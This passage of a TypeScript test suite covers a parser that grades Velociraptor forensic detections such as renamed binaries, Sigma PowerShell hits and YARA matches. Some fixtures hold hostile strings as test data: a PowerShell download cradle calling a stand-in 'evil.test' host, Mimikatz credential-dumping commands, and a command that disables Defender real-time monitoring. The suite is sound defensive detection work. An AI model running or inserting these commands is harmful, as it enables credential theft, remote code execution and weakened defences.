    const parsed = parseVelociraptorJson(JSON.stringify([row("fe80::1"), row("fe80::99")]));
    expect(parsed.events).toHaveLength(2);
  });

  it("does NOT split on a clock time, which shares IPv6's shape", () => {
    // "00:00:00" must not read as an address — otherwise every timestamped line becomes its own
    // event and aggregation stops working entirely.
    const row = (t: string): object => ({
      _Source: "Custom.Log",
      Message: `service heartbeat at ${t} — state nominal`,
      Timestamp: "2026-01-01T00:00:00Z",
    });
    const parsed = parseVelociraptorJson(JSON.stringify([row("01:02:03"), row("04:05:06")]));
    expect(parsed.events).toHaveLength(1);
    expect(parsed.events[0].count).toBe(2);
  });
});

// DetectRaptor.Windows.Detection.BinaryRename reports a file whose on-disk name does not match the
// OriginalFilename compiled into it. Every row IS a detection, but the artifact ships no `Detection`
// column, so the rows fell through to the generic key=value dump and graded Info — and Info never
// reaches the forensic timeline, so the analysis never saw them. A real case hid a cmd.exe copied to
// `java.exe` this way; a competing tool made the same artifact its headline finding.
describe("parseVelociraptorJson — BinaryRename rows (DetectRaptor.Windows.Detection.BinaryRename)", () => {
  function renameRow(overrides: Record<string, unknown> = {}): object {
    const { VersionInformation, ...rest } = overrides as Record<string, never>;
    return {
      _Source: "DetectRaptor.Windows.Detection.BinaryRename",
      Fqdn: "DESKTOP-LAB01",
      OSPath: "C:\\LockBitSim\\tools\\activemq_java_stub\\java.exe",
      Name: "java.exe",
      Size: 344129,
      VersionInformation: {
        CompanyName: "Microsoft Corporation",
        OriginalFilename: "Cmd.Exe",
        InternalName: "cmd",
        ProductName: "Microsoft\u00ae Windows\u00ae Operating System",
        ...(VersionInformation as object | undefined),
      },
      Hash: { SHA256: "96367aebfb73b9a91572f4cb0e935861ce7a015c12da8569a7ebea1d89cb8175" },
      Mtime: "2026-08-26T14:35:18.3874441Z",
      ...rest,
    };
  }

  it("names the binary the file actually is, not just the name it wears", () => {
    const e = parseVelociraptorJson(JSON.stringify([renameRow()])).events[0];
    expect(e.description).toContain("java.exe");
    expect(e.description).toContain("Cmd.Exe");
    expect(e.description).toContain("Microsoft Corporation");
  });

  it("grades a renamed system utility High and maps T1036.003", () => {
    const e = parseVelociraptorJson(JSON.stringify([renameRow()])).events[0];
    expect(e.severity).toBe("High");
    expect(e.mitreTechniques).toContain("T1036.003");
  });

  it("grades a renamed non-system binary staged in a temp directory High", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([
        renameRow({
          OSPath: "C:\\Users\\v\\AppData\\Local\\Temp\\svchost.exe",
          Name: "svchost.exe",
          VersionInformation: { OriginalFilename: "Updater.exe", CompanyName: "Acme Ltd" },
        }),
      ]),
    ).events[0];
    expect(e.severity).toBe("High");
  });

  it("still surfaces an ordinary vendor rename at Medium, never Info", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([
        renameRow({
          OSPath: "C:\\Program Files\\Acme\\setup.exe",
          Name: "setup.exe",
          VersionInformation: { OriginalFilename: "AcmeInstaller.exe", CompanyName: "Acme Ltd" },
        }),
      ]),
    ).events[0];
    expect(e.severity).toBe("Medium");
  });

  it("records the path and hash as IOCs", () => {
    const r = parseVelociraptorJson(JSON.stringify([renameRow()]));
    const vals = r.iocs.map((i) => i.value.toLowerCase());
    expect(vals).toContain("c:\\lockbitsim\\tools\\activemq_java_stub\\java.exe");
    expect(vals).toContain("96367aebfb73b9a91572f4cb0e935861ce7a015c12da8569a7ebea1d89cb8175");
  });

  it("keeps the file timestamp and host", () => {
    const e = parseVelociraptorJson(JSON.stringify([renameRow()])).events[0];
    expect(e.timestamp).toContain("2026-08-26T14:35:18");
    expect(e.description).toContain("DESKTOP-LAB01");
  });

  it("does not fire when the on-disk name already matches the original", () => {
    // Same artifact, a row where nothing was renamed: no detection to report, so it must not be
    // escalated just because the artifact name says "BinaryRename".
    const e = parseVelociraptorJson(
      JSON.stringify([renameRow({ OSPath: "C:\\Windows\\System32\\cmd.exe", Name: "cmd.exe" })]),
    ).events[0];
    expect(e.severity).not.toBe("High");
  });
});

// Regression cover for the review findings on the BinaryRename mapper. Every case below shipped
// green under the first version because each of its seven tests passed exactly one row and asserted
// only severity or description — the defects all lived in aggregation, in fields, or in inputs no
// single-row happy-path fixture reaches.
describe("parseVelociraptorJson — BinaryRename edge cases", () => {
  function row(o: Record<string, unknown> = {}): object {
    return {
      _Source: "DetectRaptor.Windows.Detection.BinaryRename",
      Fqdn: "DESKTOP-LAB01",
      OSPath: "C:\\stage\\java.exe",
      Name: "java.exe",
      VersionInformation: { OriginalFilename: "Cmd.Exe", CompanyName: "Microsoft Corporation" },
      Hash: { SHA256: "a".repeat(64), MD5: "b".repeat(32) },
      Mtime: "2026-08-26T14:35:18Z",
      ...o,
    };
  }

  it("keeps two binaries dropped at different paths as separate events", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([
        row({ OSPath: "C:\\stage1\\java.exe" }),
        row({ OSPath: "C:\\stage2\\java.exe", Hash: { SHA256: "c".repeat(64) } }),
      ]),
    );
    expect(r.events).toHaveLength(2);
    expect(r.events.map((e) => e.path).sort()).toEqual(["C:\\stage1\\java.exe", "C:\\stage2\\java.exe"]);
  });

  it("does not fold numerically-distinct names together", () => {
    // The aggregation key must not digit-strip: svchost1.exe and svchost2.exe are two files.
    const r = parseVelociraptorJson(
      JSON.stringify([
        row({ OSPath: "C:\\a\\svchost1.exe", Name: "svchost1.exe" }),
        row({ OSPath: "C:\\b\\svchost2.exe", Name: "svchost2.exe" }),
      ]),
    );
    expect(r.events).toHaveLength(2);
  });

  // The aggregation key is length-capped, and the cap used to cost a discriminator. Two rows sharing
  // a key do not merely merge a count — applyEventIdentity overwrites the survivor's path, hash and
  // description with whichever row landed last, so a collision DELETES one binary's evidence.
  //
  // A deep path is enough to reach the cap on its own, and the host used to sit LAST in the key, so
  // it was the first thing truncation threw away. That is the cross-host merge #659 fixed for
  // Windows events, arriving again by a different route: one renamed binary found on two machines,
  // reported as one machine.
  const DEEP = "C:\\" + "deep\\".repeat(80);

  it("keeps the same deep path on two hosts as two events", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([
        row({ Fqdn: "HOST-A", OSPath: DEEP + "java.exe" }),
        row({ Fqdn: "HOST-B", OSPath: DEEP + "java.exe", Hash: { SHA256: "c".repeat(64) } }),
      ]),
    );
    expect(r.events).toHaveLength(2);
    expect(r.events.map((e) => e.asset).sort()).toEqual(["HOST-A", "HOST-B"]);
  });

  it("keeps two deep paths that share a long prefix as two events", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([
        row({ OSPath: DEEP + "alpha\\java.exe" }),
        row({ OSPath: DEEP + "bravo\\java.exe", Hash: { SHA256: "c".repeat(64) } }),
      ]),
    );
    expect(r.events).toHaveLength(2);
  });

  it("grades a renamed system utility in System32 High, not Medium", () => {
    // A legitimate cmd.exe in System32 is NAMED cmd.exe. A renamed one there needs admin rights to
    // place and is the classic blend-in location, so a vendor-root allowance must not cover it.
    const e = parseVelociraptorJson(
      JSON.stringify([row({ OSPath: "C:\\Windows\\System32\\svhost.exe", Name: "svhost.exe" })]),
    ).events[0];
    expect(e.severity).toBe("High");
  });

  it("carries sha256 and md5 on the event for cross-tool correlation", () => {
    const e = parseVelociraptorJson(JSON.stringify([row()])).events[0];
    expect(e.sha256).toBe("a".repeat(64));
    expect(e.md5).toBe("b".repeat(32));
  });

  it("ignores a malformed hash rather than storing it", () => {
    const e = parseVelociraptorJson(JSON.stringify([row({ Hash: { SHA256: "not-a-hash", MD5: "" } })]))
      .events[0];
    expect(e.sha256).toBeUndefined();
    expect(e.md5).toBeUndefined();
  });

  it("surfaces a binary with no version resource instead of burying it at Info", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([
        row({
          OSPath: "C:\\Users\\v\\AppData\\Local\\Temp\\x.exe",
          Name: "x.exe",
          VersionInformation: { OriginalFilename: "", CompanyName: "" },
        }),
      ]),
    ).events[0];
    expect(e.severity).toBe("High"); // staged
    expect(e.description).toContain("no version resource");
    expect(e.description).not.toContain("is really");
    expect(e.mitreTechniques).toEqual([]); // no rename proved, so no masquerading claim
  });

  it("floors an unstaged resourceless binary at Medium", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([
        row({
          OSPath: "C:\\Tools\\helper.exe",
          Name: "helper.exe",
          VersionInformation: { OriginalFilename: "" },
        }),
      ]),
    ).events[0];
    expect(e.severity).toBe("Medium");
  });

  it("makes no rename claim when the row names no file", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([
        {
          _Source: "DetectRaptor.Windows.Detection.BinaryRename",
          Fqdn: "DESKTOP-LAB01",
          VersionInformation: { OriginalFilename: "Cmd.Exe" },
          Mtime: "2026-08-26T14:35:18Z",
        },
      ]),
    ).events[0];
    expect(e.severity).not.toBe("High");
    expect(e.description).not.toContain("is really");
  });

  it("lets an explicit rule verdict win over the inferred grade", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([row({ Detection: { Name: "Renamed binary", Criticality: "Low" } })]),
    ).events[0];
    expect(e.severity).toBe("Low");
  });
});

// The general half of the same defect: any detection rule pack whose rows match no signature lands
// in the generic key=value dump at Info, which never reaches the forensic timeline.
describe("parseVelociraptorJson — unrecognised detection-pack rows", () => {
  it("floors an unrecognised DetectRaptor row to Medium instead of Info", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([
        { _Source: "DetectRaptor.Windows.Detection.SomeNewPack", Fqdn: "H1", Widget: "unrecognised shape" },
      ]),
    ).events[0];
    expect(e.severity).toBe("Medium");
  });

  it("leaves an ordinary telemetry artifact at Info", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([{ _Source: "Windows.Sys.Users", Fqdn: "H1", Widget: "unrecognised shape" }]),
    ).events[0];
    expect(e.severity).toBe("Info");
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Findings from the 005-EtherRat/TukTuk scenario benchmark. Every case below is
// a row shape that real Velociraptor collections produce and that graded, timed,
// or attributed wrongly — each verified against the collection before it was fixed.
// ─────────────────────────────────────────────────────────────────────────────

// A masquerading binary is a COPY of the tool it impersonates, so it carries the SOURCE file's
// Mtime and gets a fresh Btime on this volume. pickTime() prefers Mtime, so all ten renamed
// binaries in the benchmark timestamped 2025-12-05 — the image-build date of the cmd.exe that was
// copied — while the intrusion ran on 2026-08-18. High-severity masquerading evidence sat eight
// months off the incident timeline, where no analyst would look for it.
describe("parseVelociraptorJson — BinaryRename drop time", () => {
  function copiedRow(o: Record<string, unknown> = {}): object {
    return {
      _Source: "DetectRaptor.Windows.Detection.BinaryRename",
      Fqdn: "DESKTOP-OPE297N",
      OSPath: "C:\\Users\\v\\AppData\\Local\\Temp\\node.exe",
      Name: "node.exe",
      VersionInformation: { OriginalFilename: "Cmd.Exe", CompanyName: "Microsoft Corporation" },
      Hash: { SHA256: "a".repeat(64) },
      Mtime: "2025-12-05T02:54:10.1128473Z",
      Ctime: "2025-12-05T02:54:10.1128473Z",
      Btime: "2026-08-18T16:14:12.6207768Z",
      ...o,
    };
  }

  it("times a copied binary at Btime — when it appeared HERE, not the source file's Mtime", () => {
    const e = parseVelociraptorJson(JSON.stringify([copiedRow()])).events[0];
    expect(e.timestamp.startsWith("2026-08-18T16:14:12")).toBe(true);
  });

  it("keeps the picked time when Btime is not later — an in-place file was not copied in", () => {
    const e = parseVelociraptorJson(JSON.stringify([copiedRow({ Btime: "2025-11-01T00:00:00Z" })])).events[0];
    expect(e.timestamp.startsWith("2025-12-05T02:54:10")).toBe(true);
  });

  it("keeps the picked time when Btime is absent or unparseable", () => {
    for (const Btime of [undefined, "", "not a date"]) {
      const e = parseVelociraptorJson(JSON.stringify([copiedRow({ Btime })])).events[0];
      expect(e.timestamp.startsWith("2025-12-05T02:54:10")).toBe(true);
    }
  });
});

// Custom VQL artifacts SELECT the columns they want, so a Windows event arrives as a flat row: a
// bare EventID with no System/EventData wrapper and no Channel. classify() sends it to the generic
// key=value dump, which grades Info — and Info never reaches the forensic timeline. The flat-EID
// overlay grades it from the per-EID table instead. (The RDP-lateral artifact is the ONE exception —
// it is graded authoritatively by rdpLateralDetect and exempt from this overlay; see evalFollowups.)
describe("parseVelociraptorJson — flat Windows EventID rows", () => {
  function logonRow(o: Record<string, unknown> = {}): object {
    return {
      EventTimestamp: "2026-08-18T15:41:08.378353595Z",
      EventID: 4648,
      ComputerName: "DESKTOP-OPE297N",
      TargetAccount: "vagrant",
      TargetDomain: "DESKTOP-OPE297N",
      InitiatingUser: "WIN-F0NC9RLBH8J$",
      SourceIP: "127.0.0.1",
      InitiatingProcess: "C:\\Windows\\System32\\svchost.exe",
      ...o,
    };
  }
  const parse = (o: Record<string, unknown> = {}): ReturnType<typeof parseVelociraptorJson> =>
    parseVelociraptorJson(JSON.stringify([logonRow(o)]), {
      artifact: "Custom.Windows.EventLogs.ExplicitCredentialLogons",
    });

  it("grades a known EventID from the Windows event table instead of Info", () => {
    const e = parse().events[0];
    expect(e.severity).not.toBe("Info");
    expect(e.mitreTechniques).toContain("T1078");
  });

  it("keeps the row's own fields in the description — the table adds a grade, it does not replace detail", () => {
    const e = parse().events[0];
    expect(e.description).toContain("TargetAccount=vagrant");
    expect(e.description).toContain("InitiatingUser=WIN-F0NC9RLBH8J$");
  });

  it("attributes the event to the host named in ComputerName", () => {
    expect(parse().events[0].asset).toBe("DESKTOP-OPE297N");
  });

  it("leaves an unknown EventID alone rather than inventing a grade", () => {
    expect(parse({ EventID: 999999 }).events[0].severity).toBe("Info");
  });

  it("never lowers a grade the row already earned", () => {
    const e = parse({ EventID: 4624, Detection: "Mimikatz credential dump", Criticality: "High" }).events[0];
    expect(["High", "Critical"]).toContain(e.severity);
  });
});

// Review follow-up on the drop-time fix. The first version parsed Btime with Date.parse and emitted
// `new Date(ms).toISOString()`, which lost Velociraptor's sub-millisecond precision and read a
// timezone-less Btime in the SERVER's own zone — so one collection dated differently on a UTC host
// and a UTC+3 host. Both cases below fail against that version on any machine.
describe("parseVelociraptorJson — BinaryRename drop time is normalized, not round-tripped", () => {
  function copiedRow(o: Record<string, unknown> = {}): object {
    return {
      _Source: "DetectRaptor.Windows.Detection.BinaryRename",
      Fqdn: "DESKTOP-OPE297N",
      OSPath: "C:\\Users\\v\\AppData\\Local\\Temp\\node.exe",
      Name: "node.exe",
      VersionInformation: { OriginalFilename: "Cmd.Exe", CompanyName: "Microsoft Corporation" },
      Mtime: "2025-12-05T02:54:10Z",
      ...o,
    };
  }

  it("keeps Btime's sub-millisecond precision", () => {
    const e = parseVelociraptorJson(JSON.stringify([copiedRow({ Btime: "2026-08-18T16:14:12.6207768Z" })]))
      .events[0];
    expect(e.timestamp).toBe("2026-08-18T16:14:12.6207768Z");
  });

  it("reads a timezone-less Btime as UTC, like every other time column", () => {
    const e = parseVelociraptorJson(JSON.stringify([copiedRow({ Btime: "2026-08-18 16:14:12" })])).events[0];
    expect(e.timestamp).toBe("2026-08-18T16:14:12Z");
  });
});

// Review follow-up on the flat-EventID overlay. WIN_EVENTS is keyed by ID ALONE — the same hazard the
// PowerShell table is split out to avoid — so grading every generic row that carries an EventID let
// any Application or Operational provider's own event 104 become a High log-clear finding.
describe("parseVelociraptorJson — flat EventID overlay is scoped to its own log", () => {
  const parse = (row: Record<string, unknown>): ReturnType<typeof parseVelociraptorJson> =>
    parseVelociraptorJson(JSON.stringify([{ ComputerName: "HOST1", Detail: "x", ...row }]), {
      artifact: "Custom.Some.Artifact",
    });

  it("does not grade a System-range EventID that names no log", () => {
    const e = parse({ EventID: 104 }).events[0];
    expect(e.severity).toBe("Info");
    expect(e.mitreTechniques ?? []).not.toContain("T1070.001");
  });

  it("grades that same EventID once the row names the System log", () => {
    const e = parse({ EventID: 104, Channel: "System" }).events[0];
    expect(e.severity).not.toBe("Info");
    expect(e.mitreTechniques).toContain("T1070.001");
  });

  it("ignores a Security EventID reused by another log", () => {
    expect(parse({ EventID: 4648, Channel: "Application" }).events[0].severity).toBe("Info");
  });

  it("still grades a Security EventID that names no log — no other provider issues one", () => {
    expect(parse({ EventID: 4648 }).events[0].severity).not.toBe("Info");
  });

  // The grade itself belongs to the event table and moves as that table is tuned. What these assert
  // is the gate: naming the log opens it, and a System-range id that names none stays shut.
  it("reads the log from LogName as well as Channel", () => {
    expect(parse({ EventID: 7045, LogName: "System" }).events[0].severity).not.toBe("Info");
    expect(parse({ EventID: 7045 }).events[0].severity).toBe("Info");
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────────
// Detection CONTENT matched as if it were attacker content.
//
// A keyword rule pack sweeping the MFT matches the filenames of the detection stack itself: the
// Sigma rules Velociraptor unpacks to run, and the EVTX-Attack-Samples corpus those rules were
// written against. "win_alert_mimikatz_keywords.yml" is a rule ABOUT mimikatz; it is not mimikatz.
// `.yms` (Velociraptor's compiled Sigma format) was already demoted — the same reasoning covers the
// source `.yml`/`.yaml` and the `.evtx`/`.etl` sample logs, which in a real collection produced 47
// of 48 High MFT events while the one true positive (a ransomware binary in ProgramData) sat among
// them.
describe("parseVelociraptorJson — a hit on detection content is not a hit on the host", () => {
  const mftRow = (osPath: string) => ({
    _Source: "DetectRaptor.Windows.Detection.MFT",
    EventTime: "2026-07-02T12:37:57.1022486Z",
    Detection: "Mimikatz Tools",
    OSPath: osPath,
    Fqdn: "H1",
  });

  it("demotes a hit on a .yml Sigma rule SOURCE file to Info", () => {
    const r = parseVelociraptorJson(JSON.stringify([mftRow("C:\\rules\\win_alert_mimikatz_keywords.yml")]));
    expect(r.events[0].severity).toBe("Info");
    expect(r.events[0].description).toContain("Mimikatz Tools");
  });

  it("demotes a hit on a .evtx sample-log filename to Info", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([
        mftRow("\\\\.\\C:\\<Err>\\<Parent 99249-4 need 3>\\sysmon_10_lsass_mimikatz_sekurlsa.evtx"),
      ]),
    );
    expect(r.events[0].severity).toBe("Info");
  });

  it("keeps full severity for an attacker file that merely ends in .yml", () => {
    const r = parseVelociraptorJson(JSON.stringify([mftRow("\\\\.\\C:\\Users\\Public\\payload.yml")]));
    expect(r.events[0].severity).toBe("High");
    expect(r.iocs.some((i) => i.type === "file" && i.value.includes("payload.yml"))).toBe(true);
  });

  it("still demotes a bare .yms filename — that extension is Velociraptor's alone", () => {
    const r = parseVelociraptorJson(JSON.stringify([mftRow("win_alert_mimikatz_keywords.yms")]));
    expect(r.events[0].severity).toBe("Info");
  });

  it("emits no file IOC for the detection-content path", () => {
    const r = parseVelociraptorJson(JSON.stringify([mftRow("C:\\rules\\file_event_win_bloodhound.yml")]));
    expect(r.iocs.some((i) => i.type === "file")).toBe(false);
  });

  it("still grades a real executable on the host at full severity", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([{ ...mftRow("\\\\.\\C:\\ProgramData\\locker.exe"), Detection: "Mimikatz Tools" }]),
    );
    expect(r.events[0].severity).toBe("High");
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────────
// Signed / generated PowerShell module bodies logged as 4104 script blocks.
//
// Windows compiles cdxml modules (NetSecurity, NetTCPIP, …) into PowerShell at import time and logs
// the generated body to EID 4104. Sigma's broad "Potentially Malicious PwSh" and alias-obfuscation
// rules match that generated scaffolding on its punctuation and alias density. In a real Hayabusa
// collection this was 107 of 121 events — the single largest false-positive source in the run.
describe("parseVelociraptorJson — generated PowerShell module bodies", () => {
  const CDXML_BODY =
    "#requires -version 3.0\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n" +
    "$__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')\r\n";

  const pwshRow = (scriptText: string) => ({
    _Source: "Windows.Sigma.Base",
    Timestamp: "2026-08-26T03:07:50Z",
    Computer: "WIN-1",
    Channel: "Microsoft-Windows-PowerShell/Operational",
    EID: 4104,
    Level: "medium",
    Title: "Potentially Malicious PwSh",
    Details: `ScriptBlock: ${scriptText}`,
    _Event: {
      System: {
        EventID: { Value: 4104 },
        Channel: "Microsoft-Windows-PowerShell/Operational",
        Computer: "WIN-1",
        TimeCreated: { SystemTime: 1764904070 },
      },
      EventData: { MessageNumber: 1, MessageTotal: 1, ScriptBlockText: scriptText },
    },
  });

  it("demotes a cdxml-generated module body to Info", () => {
    const r = parseVelociraptorJson(JSON.stringify([pwshRow(CDXML_BODY)]));
    expect(r.events[0].severity).toBe("Info");
  });

  it("demotes a body carrying a COMPLETE Authenticode signature block to Info", () => {
    const body =
      "function Get-Thing { $x = 1 }\r\n# SIG # Begin signature block\r\n# MIIF...\r\n# SIG # End signature block\r\n";
    const r = parseVelociraptorJson(JSON.stringify([pwshRow(body)]));
    expect(r.events[0].severity).toBe("Info");
  });

  it("does not demote on a pasted begin-marker with no closing block", () => {
    const body = "# SIG # Begin signature block\r\nInvoke-Mimikatz -DumpCreds\r\n";
    const r = parseVelociraptorJson(JSON.stringify([pwshRow(body)]));
    expect(r.events[0].severity).toBe("Medium");
  });

  it("never demotes a High verdict, whatever the script block is wrapped in", () => {
    const body =
      "# SIG # Begin signature block\r\n# MIIF...\r\n# SIG # End signature block\r\nInvoke-Mimikatz -DumpCreds\r\n";
    const row = { ...pwshRow(body), Level: "high", Title: "Invoke-Mimikatz Execution" };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    expect(r.events[0].severity).toBe("High");
  });

  it("reads the event id from a native System.EventID row", () => {
    const row = {
      _Source: "Windows.Detection.Sigma",
      Rule: { Title: "Potentially Malicious PwSh", Level: "medium" },
      System: {
        EventID: 4104,
        Channel: "Microsoft-Windows-PowerShell/Operational",
        Computer: "WIN-1",
        TimeCreated: "2026-08-26T03:07:50Z",
      },
      EventData: { ScriptBlockText: CDXML_BODY },
    };
    expect(parseVelociraptorJson(JSON.stringify([row])).events[0].severity).toBe("Info");
  });

  it("reads the event id from a System.EventID.Value written as a string", () => {
    const row = {
      _Source: "Windows.Detection.Sigma",
      Rule: { Title: "Potentially Malicious PwSh", Level: "medium" },
      System: {
        EventID: { Value: "4104" },
        Channel: "Microsoft-Windows-PowerShell/Operational",
        Computer: "WIN-1",
        TimeCreated: "2026-08-26T03:07:50Z",
      },
      EventData: { ScriptBlockText: CDXML_BODY },
    };
    expect(parseVelociraptorJson(JSON.stringify([row])).events[0].severity).toBe("Info");
  });

  it("keeps the rule's own grade for an attacker script block", () => {
    const body = "IEX ((New-Object Net.WebClient).DownloadString('http://evil.test/a.ps1'))";
    const r = parseVelociraptorJson(JSON.stringify([pwshRow(body)]));
    expect(r.events[0].severity).toBe("Medium");
  });

  it("does not demote a signed module body that also carries real tradecraft", () => {
    const body = `${CDXML_BODY}\r\nSet-MpPreference -DisableRealtimeMonitoring $true\r\n`;
    const r = parseVelociraptorJson(JSON.stringify([pwshRow(body)]));
    expect(r.events[0].severity).not.toBe("Info");
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────────
// The YARA hit's matched bytes.
//
// Velociraptor base64-encodes the bytes surrounding the match into `HitContext`. Scraping the whole
// row for IOCs is wrong and stays wrong (#102) — but the matched string itself is the one thing that
// tells an analyst WHY the rule fired. (A hit inside a volatile container — pagefile / crash dump —
// is graded and aggregated separately by yaraGrade; these cases use a normal dropped-file path.)
describe("parseVelociraptorJson — YARA HitContext", () => {
  const yaraRow = (hitContext: string) => ({
    _Source: "DetectRaptor.Generic.Detection.YaraFile",
    OSPath: "C:\\Users\\v\\Downloads\\cradle.bin",
    Mtime: "2026-08-26T13:52:04Z",
    Rule: "SIGNATURE_BASE_SUSP_Powershell_IEX_Download_Cradle",
    Meta: { author: "Florian Roth", source_url: "https://github.test/rules/x.yar" },
    HitContext: hitContext,
  });

  it("decodes an ASCII match into the description", () => {
    // base64("IEX ((New-Object Net.WebClient).Download")
    const r = parseVelociraptorJson(
      JSON.stringify([yaraRow("SUVYICgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZA==")]),
    );
    expect(r.events[0].description).toContain("IEX ((New-Object Net.WebClient).Download");
  });

  it("decodes a UTF-16LE match into the description", () => {
    // base64(utf16le("sekurlsa::logonpasswords"))
    const r = parseVelociraptorJson(
      JSON.stringify([yaraRow("cwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMA")]),
    );
    expect(r.events[0].description).toContain("sekurlsa::logonpasswords");
  });

  it("still refuses to scrape the rule's Meta as IOCs", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([yaraRow("SUVYICgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZA==")]),
    );
    expect(r.iocs.some((i) => i.type === "url")).toBe(false);
    expect(r.iocs.some((i) => i.type === "hash")).toBe(false);
  });

  it("adds no hit marker when HitContext decodes to nothing readable", () => {
    const r = parseVelociraptorJson(JSON.stringify([yaraRow("AAECAwQF")]));
    expect(r.events[0].description).not.toContain("[Hit:");
    expect(r.events[0].description).toContain("cradle.bin");
  });
});

// A YARA string match inside a volatile memory container (page file / crash dump) is graded Low and
// collapsed into ONE row per host — a swapped-out string is not proof a named file executed. Before
// this, every such hit was a separate High, and 60-75% of a case's High findings were page-file noise.
describe("parseVelociraptorJson — YARA volatile-container grading", () => {
  const pagefileHit = (rule: string) => ({
    _Source: "DetectRaptor.Generic.Detection.YaraFile",
    OSPath: "C:\\pagefile.sys",
    Mtime: "2026-08-26T13:52:04Z",
    Rule: rule,
  });

  it("grades a page-file hit Low and never High", () => {
    const r = parseVelociraptorJson(JSON.stringify([pagefileHit("RANSOM_Akira")]));
    expect(r.events[0].severity).toBe("Low");
    expect(r.events[0].description).toMatch(/volatile memory container/i);
  });

  it("collapses many page-file hits on one host into a single row", () => {
    const rows = ["RANSOM_Akira", "MALWARE_Cobalt", "SUSP_X"].map(pagefileHit);
    const r = parseVelociraptorJson(JSON.stringify(rows));
    const volatile = r.events.filter((e) => /volatile memory container/i.test(e.description));
    expect(volatile).toHaveLength(1);
  });

  it("does not extract the page file as a threat file IOC", () => {
    const r = parseVelociraptorJson(JSON.stringify([pagefileHit("MALWARE_X")]));
    expect(r.iocs.some((i) => i.type === "file" && i.value.includes("pagefile"))).toBe(false);
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────────
// Amcache: the name on disk versus the name in the version resource.
//
// The Amcache rule pack grades on WHAT the program is (an RMM tool → Medium). The row also carries
// the binary's own version resource, and when that disagrees with the filename the row is evidence
// of masquerading — a fact the pack's rule never looks at. binaryRenameImport already reasons about
// this shape, but never sees an Amcache row: it arrives with a `Detection` verdict and is routed to
// the detection mapper long before the Amcache branch.
describe("parseVelociraptorJson — Amcache masquerade", () => {
  const amcacheRow = (over: Record<string, unknown>) => ({
    _Source: "DetectRaptor.Windows.Detection.Amcache",
    Detection: {
      Name: "RMM - RustDesk",
      Criticality: "Medium",
      PathName: "c:\\program files\\rustdesk\\rustdesk.exe",
    },
    KeyMTime: "2026-08-27T15:06:01Z",
    EntryName: "RustDesk.exe",
    EntryPath: "c:\\program files\\rustdesk\\rustdesk.exe",
    Publisher: "microsoft corporation",
    OriginalFileName: "rustdesk.exe",
    SHA1: "d833f189f179c7384b225513e43e3e7d976d1d3f",
    Fqdn: "H1",
    ...over,
  });

  it("escalates a name/version-resource mismatch above the rule pack's grade", () => {
    const e = parseVelociraptorJson(JSON.stringify([amcacheRow({ OriginalFileName: "notepad.exe" })]))
      .events[0];
    expect(e.severity).toBe("High");
  });

  it("names both spellings so the analyst sees the mismatch", () => {
    const e = parseVelociraptorJson(JSON.stringify([amcacheRow({ OriginalFileName: "notepad.exe" })]))
      .events[0];
    expect(e.description).toContain("RustDesk.exe");
    expect(e.description).toContain("notepad.exe");
  });

  it("tags the mismatch as T1036.005", () => {
    const e = parseVelociraptorJson(JSON.stringify([amcacheRow({ OriginalFileName: "notepad.exe" })]))
      .events[0];
    expect(e.mitreTechniques).toContain("T1036.005");
  });

  it("leaves a row whose two names agree at the rule pack's own grade", () => {
    const e = parseVelociraptorJson(JSON.stringify([amcacheRow({})])).events[0];
    expect(e.severity).toBe("Medium");
    expect(e.mitreTechniques).not.toContain("T1036.005");
  });

  it("does not fire on a version-resource name that differs only in case or extension casing", () => {
    const e = parseVelociraptorJson(JSON.stringify([amcacheRow({ OriginalFileName: "RUSTDESK.EXE" })]))
      .events[0];
    expect(e.severity).toBe("Medium");
  });
});

// The per-import event cap truncates a huge MFT/USN artifact; the parse result must report how many
// rows were omitted (not just how many were kept) so the import note can make the loss visible.
describe("parseVelociraptorJson — truncation is counted, not silent", () => {
  it("reports dropped rows when the event cap truncates the import", () => {
    // 50 distinct Info telemetry rows, capped to 10 → 40 omitted.
    const rows = Array.from({ length: 50 }, (_, i) => ({
      _Source: "Windows.Forensics.Usn",
      OSPath: `C:\\Users\\v\\Documents\\file${i}.txt`,
      Reason: "DATA_EXTEND|CLOSE",
      Usn: i,
    }));
    const r = parseVelociraptorJson(JSON.stringify(rows), { maxEvents: 10, aggregate: false });
    expect(r.kept).toBe(10);
    expect(r.total).toBe(50);
    expect(r.dropped).toBe(40);
    // groups > kept confirms the CAP truncated (not a severity-floor/unparseable drop) — the import
    // note only claims "omitted at the event cap" under exactly this condition.
    expect(r.groups).toBeGreaterThan(r.kept);
  });

  it("does not overstate cap truncation when the drop is a severity floor, not the cap", () => {
    // 5 Low rows dropped by a High floor, well under the cap → groups do NOT exceed kept, so the
    // import note must not attribute the loss to the event cap.
    const rows = Array.from({ length: 5 }, (_, i) => ({
      _Source: "Windows.EventLogs.Evtx",
      System: {
        EventID: 4624,
        Channel: "Security",
        Computer: "H",
        TimeCreated: "2026-08-26T03:00:0" + i + "Z",
      },
      EventData: { LogonType: "3" },
    }));
    const r = parseVelociraptorJson(JSON.stringify(rows), { minSeverity: "High" });
    expect(r.kept).toBe(0);
